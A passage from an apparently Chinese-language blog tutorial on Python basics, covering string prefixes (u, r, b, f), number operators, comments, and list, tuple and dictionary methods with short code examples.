class="comment">#outs：my name is Atuoa        ,whats your name?</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">&#x27; &#x27;</span>.join(add_info.split()) <span class="comment">#join</span></span><br><span class="line"><span class="built_in">print</span>(id_info,tmp)</span><br><span class="line"><span class="comment">#outs：my name is Atuoa ,whats your name?</span></span><br><span class="line"><span class="comment">#join的调用其实有点变扭用的也比较少，usage：string.join(),括号中参数 是一个列表，这里暂且不讨论，后面有详细提及</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>字符串前缀</p>
<ol>
<li>   字符串前加 u或者不加  </li>
</ol>
<blockquote>
<p>   举例：u”字符串中有中文”<br>   含义<br>   1、前缀u表示该字符串是unicode编码<br>   2、Python2中用，用在含有中文字符的字符串前，防止因为编码问题，导致中文出现乱码。<br>   3、一般要在文件开关标明编码方式采用utf8。<br>   4、Python3中，所有字符串默认都是unicode字符串。  </p>
</blockquote>
<ol start="2">
<li>字符串前加 r  </li>
</ol>
<blockquote>
<p>   举例：r”adc\n\r\tdkfjkd”<br>   含义<br>   1、前缀r表示该字符串是原始字符串，即\不是转义符，只是单纯的一个符号。<br>   2、常用于特殊的字符如换行符、正则表达式、文件路径。<br>   3、注意不能在原始字符串结尾输入反斜线，否则Python不知道这是一个字符还是换行符(字符串最后用\表示换行)  </p>
</blockquote>
<ol start="3">
<li>字符串前加 b  </li>
</ol>
<blockquote>
<p>   含义<br>   1、前缀b表示该字符串是bytes类型。<br>   2、用在Python3中，Python3里默认的str是unicode类。Python2的str本身就是bytes类，所以可不用。<br>   3、常用在如网络编程中，服务器和浏览器只认bytes类型数据。如：send 函数的参数和 recv 函数的返回值都是 bytes 类型。<br>   4、在 Python3 中，bytes 和 str 的互相转换方式是<br>   str.encode(‘utf-8’)<br>   bytes.decode(‘utf-8’)  </p>
</blockquote>
<ol start="4">
<li>字符串前加 f  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testFStr</span>():</span></span><br><span class="line">    name = <span class="string">&#x27;alex&#x27;</span></span><br><span class="line">    age = <span class="number">25</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;my name is <span class="subst">&#123;name&#125;</span>, i am <span class="subst">&#123;age&#125;</span> years old&#x27;</span>)</span><br><span class="line"></span><br><span class="line">testFStr()</span><br></pre></td></tr></table></figure>

<p>  含义 </p>
<blockquote>
<p>   1、Python3.6新加特性，前缀f用来格式化字符串。可以看出f前缀可以更方便的格式化字符串,比format()方法可读性高且使用方便。<br>   2、而且加上f前缀后,支持在大括号内,运行Python表达式。<br>   3、还可以用fr前缀来表示原生字符串。    </p>
</blockquote>
</li>
</ul>
<p>更多：</p>
<p><a href="https://docs.python.org/3/library/stdtypes.html#string-methods">string官方文档</a></p>
<h3 id="数字（number）"><a href="#数字（number）" class="headerlink" title="数字（number）"></a>数字（number）</h3><table>
<thead>
<tr>
<th>运算符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加法</td>
</tr>
<tr>
<td>-</td>
<td>减法</td>
</tr>
<tr>
<td>*</td>
<td>乘法</td>
</tr>
<tr>
<td>/</td>
<td>除法</td>
</tr>
<tr>
<td>//</td>
<td>整除（也叫地板除法floor division）</td>
</tr>
<tr>
<td>%</td>
<td>求模（取余）</td>
</tr>
<tr>
<td>**</td>
<td>乘幂</td>
</tr>
</tbody></table>
<p>简单的介绍三个数字函数：</p>
<p><code>divmod()</code>接受两个参数，返回一个元组（tuple）第一个值为商，第二值为余数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">divmod</span>(<span class="number">9</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<p><code>int()</code> ,括号内可以接受整形或浮点型变量，但不能是字符串</p>
<p><code>str()</code>函数可以将数值转换为字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greet = <span class="string">&quot;hello&quot;</span></span><br><span class="line">name = <span class="number">123</span></span><br><span class="line"><span class="built_in">print</span>(greet,<span class="built_in">str</span>(name))</span><br><span class="line"><span class="comment">#outs:hello 123 #print中</span></span><br></pre></td></tr></table></figure>

<p>py2中   整数/整数依旧是向下取整 ，类似于c++</p>
<p>py3中 会显示正常计算的结果</p>
<p>更多：</p>
<p><a href="https://docs.python.org/3/library/math.html">math官方文档</a></p>
<p>python内建的数学函数执行效率较低，占用内存较大，所以介绍的相对较少，一般py用于大数据处理时会用第三方的库numpy。</p>
<h3 id="注释-（annotation）"><a href="#注释-（annotation）" class="headerlink" title="注释 （annotation）"></a>注释 （annotation）</h3><ul>
<li>采用<code>#</code>发起的单行注释</li>
<li>采用<code>&#39;&#39;&#39;</code>或者<code>&quot;&quot;&quot;</code>引起的多行注释</li>
</ul>
<h3 id="利用-连接两行字符"><a href="#利用-连接两行字符" class="headerlink" title="利用 \连接两行字符"></a>利用 \连接两行字符</h3><p>可以使用反斜杠(\)来连接两行内容，将其放在第一行的末尾，py将第二行和第一行解释为1行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">example = <span class="string">&#x27;abc&#x27;</span> + \</span><br><span class="line">			<span class="string">&#x27;defg&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="comment">#out : abcdefg</span></span><br></pre></td></tr></table></figure>

<h2 id="py容器（列表，元组，字典，集合）"><a href="#py容器（列表，元组，字典，集合）" class="headerlink" title="py容器（列表，元组，字典，集合）"></a>py容器（列表，元组，字典，集合）</h2><h3 id="列表（list）"><a href="#列表（list）" class="headerlink" title="列表（list）"></a>列表（list）</h3><p>列表可以近似的理解成一个数组，下面是一个列表的例子</p>
<ol>
<li><p>指定元素创建列表</p>
<p>usage：<code>列表名 = [&#39;元素1&#39;,&#39;元素2&#39;,&#39;元素3&#39;,&#39;元素4&#39;]</code> （单引号+方括弧）</p>
<p>输出<code>print(列表名[0])</code> 即为 “元素1”</p>
<p><strong>tips</strong>:元素可以是任意的py对象，可以是变量，或者是新的列表和元组(姑且称之为嵌套，无统一叫法，叫套娃也行？)</p>
</li>
<li><p>利用<code>list()</code>方法创建一个空列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">another_empty_list = lsit()</span><br><span class="line"><span class="built_in">print</span>(another_empty_list)</span><br><span class="line"><span class="comment">#out:[]  #表示打印了一个空数组 ，列表可以直接打印</span></span><br></pre></td></tr></table></figure>

<p>list()不仅只有这些功能，(始终记住py中表示字符串单双引号均可，习惯单引号)list函数参数接受一个字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将一个英文单词转化为列表</span></span><br><span class="line">list_cat = <span class="built_in">list</span>(<span class="string">&#x27;cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (lsit_cat) <span class="comment">#outs：[&#x27;c&#x27;,&#x27;a&#x27;,&#x27;t&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将一个元组转化为列表</span></span><br><span class="line">alphabet = (<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">list</span>(alphabet))<span class="comment">#outs:[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于列表中包含各种元素灵活特性（见上一个tips）所以一些看起来很奇怪的套娃也是可以通过编译的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">element = <span class="string">&#x27;a&#x27;</span></span><br><span class="line">a_tuple = (<span class="string">&#x27;hey&#x27;</span>,<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">example = [<span class="string">&quot;e1&quot;</span>,<span class="string">&quot;e2&quot;</span>,<span class="number">2</span>,element,a_tuple]</span><br><span class="line"><span class="built_in">print</span>(example)</span><br><span class="line"><span class="comment">#outs: [&#x27;e1&#x27;, &#x27;e2&#x27;, 2, &#x27;a&#x27;, (&#x27;hey&#x27;,&#x27;hello&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>当然为了不让自己逻辑混乱尽量少用套娃</p>
<h4 id="列表的方法"><a href="#列表的方法" class="headerlink" title="列表的方法"></a>列表的方法</h4><ul>
<li><p><strong>修改值</strong> <code>列表名[0] = &#39;元素0&#39;</code>,这样原列表中的“元素1”就被修改成了“元素0”</p>
</li>
<li><p><strong>添加元素</strong> 利用方法 <code>append ()</code></p>
<p><code>列表名.append(&#39;元素5&#39;)</code>,这条代码会在列表末尾加一个“元素5”</p>
<p>此方法参数可以填另一个列表甚至元组</p>
</li>
<li><p><strong>批量添加元素</strong> 利用方法<code>extend()</code>或者<code>+=</code>(推荐，类c语法)</p>
   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">family = [<span class="string">&#x27;mother&#x27;</span>,<span class="string">&#x27;father&#x27;</span>]</span><br><span class="line">ext_family = [<span class="string">&#x27;me&#x27;</span>]</span><br><span class="line">family += ext_family</span><br><span class="line"><span class="built_in">print</span>(family)</span><br><span class="line"><span class="comment">#outs: [&#x27;mother&#x27;, &#x27;father&#x27;, &#x27;me&#x27;]</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>插入元素</strong> 利用方法 <code>insert()</code></p>
<p><code>列表名.insert(0,&#39;元素0&#39;)</code>，这条代码会在原本“元素1”的位置插入一个”元素0”，且此后的每一个元素右移一个位置</p>
</li>
<li><p><strong>删除元素</strong> </p>
<p> <code>del 列表名[0]</code>这样就删除了原列表中的“元素1”，不可以继续使用他的值</p>
<p> <code>列表名.pop()</code> pop会删除列表末尾的元素，概念来自于栈，弹出最后一个，此时可将弹出的元素存储在一个变量中，可以继续使用他的值</p>
<p> <code>列表名 .remove(&#39;元素0&#39;)</code>，根据元素值进行删除，若存储在一个变量中，也可以继续使用他的值</p>
</li>
<li><p><strong>组织列表（排序）</strong></p>
<p> <code>列表名.sort()</code>         可以根据首字母顺序排序</p>
<p> 上述sort方法中括号内可以加入参数 <code>reverse = True</code>字母倒序排序</p>
<p> sort对元素的顺序修改时永久的</p>
<p> <code>sorted()</code>函数用于临时排序不影响列表中的原始排序</p>
<p> 也可以使用<code>reverse = True</code> 来实现字母倒序</p>
</li>
<li><p><strong>倒着打印列表</strong></p>
<p>  利用方法<code>reverse()</code>，是永久性修改顺序</p>
<p>  顺便一提，切片的方法依旧可以在列表当中使用，比如逆序列表可以巧妙地使用<code>list_name[::-1]</code></p>
</li>
</ul>
<p>​        利用函数<code>len()</code>可以快速得到列表的长度，ps：py计算列表元素数是从1开始算起，不用考虑0的计数</p>
<ul>
<li><p><strong>获取元素在列表中的位置</strong></p>
<p>​    使用方法<code>index()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">test.index(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#outs: 0</span></span><br><span class="line">test.index(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment">#outs: 1</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>in判断元素是否在列表中</strong></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> test)</span><br><span class="line"><span class="comment">#outs: True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;atuoa&#x27;</span> <span class="keyword">in</span> test)</span><br><span class="line"><span class="comment">#outs: False</span></span><br><span class="line"><span class="comment">#返回值为逻辑真假	</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>使用方法<code>count()</code>统计元素在列表中出现次数</strong> </p>
<p>usage：<code>list_name.count(&#39;element&#39;)</code></p>
</li>
<li><p><strong>使用<code>join()</code>转换为字符串</strong></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(test))</span><br><span class="line"><span class="comment">#outs:a,b,c</span></span><br></pre></td></tr></table></figure>

<h5 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">magicians = [ <span class="string">&#x27;alince&#x27;</span> , <span class="string">&#x27;david&#x27;</span> , <span class="string">&#x27;carolina&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> magician <span class="keyword">in</span> magicians :</span><br><span class="line">    <span class="built_in">print</span>(magician)</span><br></pre></td></tr></table></figure>

<p>改段代码示例中用了for循环，magician是一个变量，magicians是一个列表，可以用变量来遍历整个列表</p>
<p><em><strong>不要忘记冒号，表示下一行是循环的第一行</strong></em></p>
<p><em><strong>python要求强制缩进，注意缩进可能引发的问题</strong></em></p>
<hr>
<h5 id="数值列表"><a href="#数值列表" class="headerlink" title="数值列表"></a>数值列表</h5><ul>
<li>函数range生成数字</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>) <span class="comment">#[1,6)</span></span><br><span class="line">	<span class="built_in">print</span>(value)</span><br><span class="line"> <span class="comment">#outs:1,2,3,4,5</span></span><br></pre></td></tr></table></figure>

<p>输出数字1-5，6取不到</p>
<p>range 可以指定步长 例如range(2,11,2)</p>
<p>则是该函数从2至11步长为2 </p>
<ul>
<li><p>使用list()函数来创建数字列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">numbers = <span class="built_in">list</span> (<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span> (numbers)</span><br><span class="line"><span class="comment">#outs：[1,2,3,4,5]</span></span><br></pre></td></tr></table></figure></li>
<li><p>对数值列表的简单统计计算</p>
<p>max(),min(),sum()三个内建函数</p>
<p>usage:<code>sum(list_name)</code></p>
</li>
<li><p>列表解析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表名  表达式（range的） 变量      范围      </span></span><br><span class="line">squares = [value**<span class="number">2</span> <span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">11</span>)]</span><br><span class="line"><span class="built_in">print</span>(squares)</span><br><span class="line"><span class="comment">#outs:[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span></span><br></pre></td></tr></table></figure>

<p>可以减少代码行数</p>
</li>
<li><p>将字符串列表转换为数值列表</p>
</li>
</ul>
<p>map函数第一个参数接受数值转换的类型，第二个参数是待转的字符串；但是map函数的返回值是一段内存空间，不能直接打印还需要用list函数转换为列表，这样就变成数值函数了</p>
<p>关于数值列表与字符串列表的相互转换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#number_list convert string_list</span></span><br><span class="line">number_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">str_list = []</span><br><span class="line"><span class="keyword">for</span> ele <span class="keyword">in</span> number_list:</span><br><span class="line">    str_list.append(<span class="built_in">str</span>(ele))</span><br><span class="line"><span class="built_in">print</span>(str_list)</span><br><span class="line"><span class="comment">#outs:[&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#number_list convert string_list</span></span><br><span class="line">str_list = [<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>]</span><br><span class="line">number_list = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,str_list))</span><br><span class="line"><span class="built_in">print</span>(number_list)</span><br><span class="line"><span class="comment">#outs:[4,5,6]</span></span><br></pre></td></tr></table></figure>



<h5 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h5><p><strong>作用</strong> ：输出部分列表</p>
<p>与range方法相同，切片的[0:3]表示也是0，1，2三个元素，不包括3，即<code>[0,3)</code></p>
<p>切片可以缺省[:3]就是表示从列表的第一个元素开始</p>
<p>可以用负数作为索引，例如[-3:]就是指该列表的最后三个元素</p>
<ul>
<li><p><strong>遍历切片</strong></p>
<p>仅将for循环中的列表换成切片即可实现例如</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 省略列表的定义 #该段程序省略了玩家名字，效果就是名字首字母大写输出</span></span><br><span class="line"><span class="keyword">for</span> player <span class="keyword">in</span> players[:<span class="number">3</span>]</span><br><span class="line">	<span class="built_in">print</span>(player.title() )</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>复制列表</strong></li>
</ul>
<ol>
<li>使用<code>.copy()</code>方法</li>
<li><code>list()</code>转换函数</li>
<li>列表分片法<code>copy_list = list_name[:]</code></li>
</ol>
<p>值得一提的是，复制列表并不可以直接用<code>列表名 = 列表名</code>的形式，会导致两个变量名都指向一个列表的情况，一般使用缺省的切片来实现复制列表操作例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_list = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">copy_list = test_list.copy() <span class="comment">#.copy()方法实现</span></span><br><span class="line">copy_lsit = <span class="built_in">list</span>(test_lsit) <span class="comment">#list转换函数</span></span><br><span class="line">copy_list = test_list[:]  <span class="comment">#列表分片法实现</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就可以实现复制列表的操作，若直接用列表名=列表名的形式 <code>copy_list = test_list</code>,就会导致两个列表变量指向同一个列表的情况，有点类似c系语言中两个指针指向同一个内存区域</p>
<h3 id="元组（tuple）"><a href="#元组（tuple）" class="headerlink" title="元组（tuple）"></a>元组（tuple）</h3><p>与列表不同，元组无法改变元素的值，用小括弧“（”“）”引起的，先从建立一个元组开始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">empty_tuple = ()</span><br><span class="line"><span class="built_in">print</span>(empty_tuple)</span><br><span class="line"><span class="comment">#outs: ()</span></span><br></pre></td></tr></table></figure>

<p>建立一个非空元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = (<span class="number">1</span>,<span class="number">3</span>) <span class="comment">#定义元组时可以去掉括号，但加上括号语法更清晰</span></span><br><span class="line"><span class="built_in">print</span>(test[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#outs：1</span></span><br><span class="line">a,b = test <span class="comment">#将元组分给多个变量，该过程称为元组解包</span></span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line"><span class="comment">#outs: 1 3</span></span><br></pre></td></tr></table></figure>

<p>语法与列表基本相同，少了很多方法，与列表<code>list()</code>相对的方法,元组有<code>tuple()</code>作用是将其他类型转换为元组</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">family = [<span class="string">&#x27;monther&#x27;</span>,<span class="string">&#x27;father&#x27;</span>,<span class="string">&#x27;me&#x27;</span>]</span><br><span class="line">tuple_family = <span class="built_in">tuple</span>(family)</span><br><span class="line"><span class="built_in">print</span>(tuple_family)</span><br><span class="line"><span class="comment">#outs:(&#x27;monther&#x27;, &#x27;father&#x27;, &#x27;me&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>重要特性：</p>
<p>元组<strong>无法更改元素</strong> ，但是可以更改整个元组变量，例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = (<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> test:</span><br><span class="line">    <span class="built_in">print</span> (t)</span><br><span class="line">test = (<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> test:</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>

<p>使用中，元组使用的相对较少，以下是元组的一些优点;</p>
<ul>
<li>占用内存小</li>
<li>值不会被意外篡改</li>
<li>可以作为字典的键</li>
<li>函数的参数是以元组的形式传递的</li>
<li>命名元组(named tuple)可以作为对象替代（下文类中提到）</li>
</ul>
<h3 id="字典（dictionary）"><a href="#字典（dictionary）" class="headerlink" title="字典（dictionary）"></a>字典（dictionary）</h3><h4 id="创建一个字典"><a href="#创建一个字典" class="headerlink" title="创建一个字典"></a>创建一个字典</h4><p>字典用于存储一个键值对应类型，按照惯例，从创建一个空字典开始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">empty_dictionary = &#123;&#125;</span><br><span class="line"><span class="built_in">print</span>(empty_dictionary)</span><br><span class="line"><span class="comment">#outs:&#123;&#125;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alien_0 = &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;points&#x27;</span>:<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (alien_0[<span class="string">&#x27;color&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> (alien_0[<span class="string">&#x27;points&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>字典“键-值”对应，每一组之用逗号隔开</p>
<p>更改字典的值<code>alien_0[&#39;color&#39;]= &#39;yellow&#39;  </code></p>
<p>删键只需要键本身<code>del alien_0 [&#39;color&#39;]</code>如此便会删除color的值</p>
<h4 id="遍历字典"><a href="#遍历字典" class="headerlink" title="遍历字典"></a>遍历字典</h4><p>利用for循环来遍历字典操作，事先加了一点for循环，应该可以理解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_0 = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;efermi&#x27;</span>, <span class="comment">#key : value</span></span><br><span class="line">    <span class="string">&#x27;first&#x27;</span> : <span class="string">&#x27;enrico&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;last&#x27;</span> : <span class="string">&#x27;fermi&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> user_0.items():</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;\nkey: &quot;</span> + key)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;value: &quot;</span> + value)</span><br><span class="line"><span class="comment">#outs:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;key: username #多行注释，输出无三个单引</span></span><br><span class="line"><span class="string">value: efermi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key: first</span></span><br><span class="line"><span class="string">value: enrico</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key: last</span></span><br><span class="line"><span class="string">value: fermi&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>items()</code>方法是将键和值取出的方法，同样的，仅需要值（values）可以用方法<code>values()</code>,返回值是列表（<code>dict_keys()</code>非完整列表）</p>
<h4 id="添加或修改元素"><a href="#添加或修改元素" class="headerlink" title="添加或修改元素"></a>添加或修改元素</h4><p>与列表不同的是，字典没有那么多的方法用于添加和修改元素，而是提供一个更简洁的语法,例子如下</p>
<p>usage：<code>dict_name [&#39;key&#39;]=&#39;value&#39; </code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">traffic = &#123;<span class="string">&#x27;cars&#x27;</span>:<span class="string">&#x27;car&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;bike&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;pedestrian&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="built_in">print</span>(traffic)</span><br><span class="line"><span class="comment">#outs:&#123;&#x27;cars&#x27;: &#x27;car&#x27;, &#x27;bikes&#x27;: &#x27;pedestrian&#x27;&#125;</span></span><br><span class="line"><span class="comment">#py不允许一个字典中key重复，如果重复，就会像上面一样被后面出现的值替换</span></span><br><span class="line">traffic[<span class="string">&#x27;bikes&#x27;</span>] = <span class="string">&#x27;bike&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(traffic)</span><br><span class="line"><span class="comment">#outs:&#123;&#x27;cars&#x27;: &#x27;car&#x27;, &#x27;bikes&#x27;: &#x27;bike&#x27;&#125;</span></span><br><span class="line"><span class="comment">#这样就正常啦，完成了一个修改值的操作</span></span><br><span class="line">traffic[<span class="string">&#x27;places&#x27;</span>] = <span class="string">&#x27;place&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(traffic)</span><br><span class="line"><span class="comment">#outs:&#123;&#x27;cars&#x27;: &#x27;car&#x27;, &#x27;bikes&#x27;: &#x27;bike&#x27;, &#x27;places&#x27;: &#x27;place&#x27;&#125;</span></span><br><span class="line"><span class="comment">#添加键值对也可以用这种方式直接完成</span></span><br></pre></td></tr></table></figure>

<h4 id="使用update-合并两个字典"><a href="#使用update-合并两个字典" class="headerlink" title="使用update()合并两个字典"></a>使用<code>update()</code>合并两个字典</h4><p>usage：<code>old_dict_name.update(add_dict_name)</code></p>
<p>同样的，如果合并进来的字典中键与原字典中键重复，则新键覆盖旧键</p>
<h4 id="使用del删除键值对"><a href="#使用del删除键值对" class="headerlink" title="使用del删除键值对"></a>使用del删除键值对</h4><p>usage: <code>del dict_name[&#39;del_key&#39;]</code></p>
<h4 id="使用clear-删除所有元素"><a href="#使用clear-删除所有元素" class="headerlink" title="使用clear()删除所有元素"></a>使用<code>clear()</code>删除所有元素</h4><p>usage：<code>dict_name.clear()</code>变成一个空字典</p>
<h4 id="使用in判断是否存在字典中"><a href="#使用in判断是否存在字典中" class="headerlink" title="使用in判断是否存在字典中"></a>使用in判断是否存在字典中</h4><p>usage： <code>&#39;search_key&#39; in dict_name</code>返回值为Ture/False</p>
<h4 id="字典转列表-使用list"><a href="#字典转列表-使用list" class="headerlink" title="字典转列表(使用list())"></a>字典转列表(使用<code>list()</code>)</h4><p>因为在列表中提过<code>list()</code>的用法，这里再次提及一是为了回顾，二是字典转列表的操作往往可以和json的数据格式解析对应起来，而获取api返回的格式json正在成为主流，下面加粗文字也是踩过的一个坑。</p>
<p>   仅需要键（keys）可以用方法<code>keys()</code>，实质是返回一个列表（<code>dict_keys()</code>非完整列表），可以用于遍历和查询，<strong>此方法返回的不是一个完整的列表（是一种迭代形式），如需转换成完整的列表，可以用<code>list()</code>方法</strong>，另外<code>items()</code>,<code>values()</code>也相同，如下(这里还有一点就是py2.7中返回的时一个完整的列表而不是迭代器，不过现在2.7停止维护基本使用的都是py3，这里当作了解下)</p>
<ul>
<li><p>keys()获取所有键，返回一个列表（不完整）</p>
</li>
<li><p>value()获取所有值，返回一个列表（不完整）</p>
</li>
<li><p>items()获取所有键值对，返回一个列表，每一个键值对都以元组的形式存在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">traffic = &#123;<span class="string">&#x27;cars&#x27;</span>:<span class="string">&#x27;car&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;bike&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;bikes&#x27;</span>:<span class="string">&#x27;pedestrian&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line"><span class="built_in">print</span> ( traffic.items())</span><br><span class="line"><span class="built_in">print</span>(traffic.keys())</span><br><span class="line"><span class="comment">#dict_items([(&#x27;cars&#x27;, &#x27;car&#x27;), (&#x27;bikes&#x27;, &#x27;pedestrian&#x27;)])</span></span><br><span class="line"><span class="comment">#dict_keys([&#x27;cars&#x27;, &#x27;bikes&#x27;])</span></span><br></pre></td></tr></table></figure>

<p>这部分有点绕，上机写一下会清楚很多</p>
</li>
</ul>
<p>usage:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signals = &#123;<span class="string">&#x27;green&#x27;</span>:<span class="string">&#x27;go&#x27;</span>,<span class="string">&#x27;yellow&#x27;</span>:<span class="string">&#x27;go fast&#x27;</span>,<span class="string">&#x27;red&#x27;</span>:<span class="string">&#x27;stop&#x27;</span>&#125;</span><br><span class="line">signals.keys()</span><br><span class="line"><span class="comment">#outs ：dict_keys([&#x27;green&#x27;,&#x27;yellow&#x27;,&#x27;red&#x27;])</span></span><br><span class="line"><span class="comment">#call func &quot;list()&quot; to transfer an normal list</span></span><br><span class="line"><span class="built_in">list</span>( signals.keys() )</span><br><span class="line"><span class="comment">#outs [&#x27;green&#x27;,&#x27;yellow&#x27;,&#x27;red&#x27;]</span></span><br><span class="line"><span class="comment">#this is a normal list</span></span><br></pre></td></tr></table></figure>

<h4 id="列表转字典（使用dict-）"><a href="#列表转字典（使用dict-）" class="headerlink" title="列表转字典（使用dict()）"></a>列表转字典（使用<code>dict()</code>）</h4><p>使用<code>dict()</code>可以将双值子序列的序列(可以是元组、列表)转换为字典，每个子序列的第一个元素做为key，第二元素作为value.(双值子序列即序列中每个元素符合“键-值对应”的序列)</p>
<p>usage：</p>
